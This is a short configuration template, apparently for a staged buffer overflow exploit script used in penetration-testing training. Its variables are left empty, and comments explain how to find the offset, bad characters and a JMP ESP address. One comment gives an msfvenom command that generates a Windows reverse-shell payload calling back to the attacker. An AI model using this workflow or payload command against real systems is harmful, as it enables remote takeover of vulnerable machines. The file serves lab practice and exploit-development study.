# Change these if you need to
# Required for all the stages
## Remember to add a space or line break after
prefix = ""
## Remember to add a space or line break before
postfix = ""


# Required for stage 2 only
## You can generate a pattern with
##      msf-pattern_create -l $n
pattern = ""


# Required for stage 3 and onwards
offset = 0
## Put ONLY the bad characters here
bad_chars = "\x00"


# Required for Stage 5 only
## Jump address can be located by running
##      !mona jmp -r esp -cpb "\x00..."
## Remember to change to the correct bit order (endian) format
## e.g. 12345678 -> \x78\x56\x34\x12
retn = ""
## Payload can be generated with
##      msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=80 EXITFUNC=thread -b "\x00..." -f c
payload = ""
## Recommended: 32
padding_amount = 32
